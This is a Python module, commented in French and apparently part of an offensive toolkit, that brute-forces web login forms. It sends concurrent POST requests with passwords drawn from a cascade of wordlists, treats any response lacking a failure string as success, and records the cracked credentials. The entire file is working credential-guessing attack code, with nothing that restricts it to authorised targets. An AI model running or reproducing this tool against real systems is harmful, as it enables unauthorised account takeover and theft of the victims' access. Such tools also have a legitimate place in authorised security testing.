import asyncio
import aiohttp
import os 
from core.reporter import add_finding
from core.utils import resolve_wordlist

async def attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore):
    """Effectue une tentative de connexion unique."""
    data = {
        user_field: username,
        pass_field: password
    }
    
    async with semaphore:
        try:
            async with session.post(url, data=data, timeout=5, allow_redirects=True) as resp:
                content = await resp.text()
                
                # Si le message d'échec n'est PAS dans la réponse, c'est peut-être un succès
                if fail_msg not in content:
                    print(f"\n[\033[92m+\033[0m] SUCCÈS : Mot de passe trouvé : \033[1m{password}\033[0m")
                    return password
        except Exception:
            pass
    return None

async def start_brute(url, username, wordlist_path, user_field, pass_field, fail_msg, threads):
    print(f"[*] Lancement du Brute Force sur {url} (Cible: {username})")
    
    # --- MODE CASCADE (AUTO-PILOT) ---
    wordlists_to_try = []
    if wordlist_path == "auto":
        print("[\033[94m*\033[0m] Mode Auto-Pilot activé : Lancement de la cascade.")
        if os.path.exists("custom_wordlist.txt"):
            wordlists_to_try.append("custom_wordlist.txt")
        wordlists_to_try.append("pass_top10k.txt")
    else:
        wordlists_to_try.append(wordlist_path)
    
    semaphore = asyncio.Semaphore(threads)
    
    async with aiohttp.ClientSession() as session:
        for wl_name in wordlists_to_try:
            real_path = resolve_wordlist(wl_name)
            if not real_path:
                continue
                
            print(f"\n[*] Attaque en cours avec l'arsenal : \033[1m{wl_name}\033[0m ...")
            tasks = []
            
            try:
                with open(real_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        password = line.strip()
                        if not password: continue
                        
                        tasks.append(attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore))
                
                if not tasks:
                    continue

                # --- L'AMÉLIORATION ASYNCHRONE : EARLY EXIT ---
                # as_completed nous permet de traiter les réponses dès qu'elles arrivent
                for coro in asyncio.as_completed(tasks):
                    res = await coro
                    if res:
                        add_finding("Brute Force Web", url, f"Accès trouvé ! Utilisateur: **{username}** | Password: **{res}**")
                        return # Arrêt total ! On ne teste pas les autres dictionnaires.
                
                print(f"[-] Aucun mot de passe valide dans {wl_name}.")
                
            except Exception as e:
                print(f"[-] Erreur lors de la lecture de {wl_name} : {e}")

    # Si la boucle des dictionnaires se termine sans succès
    print("\n[-] Échec : Le compte a résisté à toutes nos listes d'attaque.")

def run_brute_custom(args):
    """Wrapper pour arsenal.py"""
    asyncio.run(start_brute(
        args.url, args.user, args.wordlist, 
        args.user_field, args.pass_field, args.fail, args.threads
    ))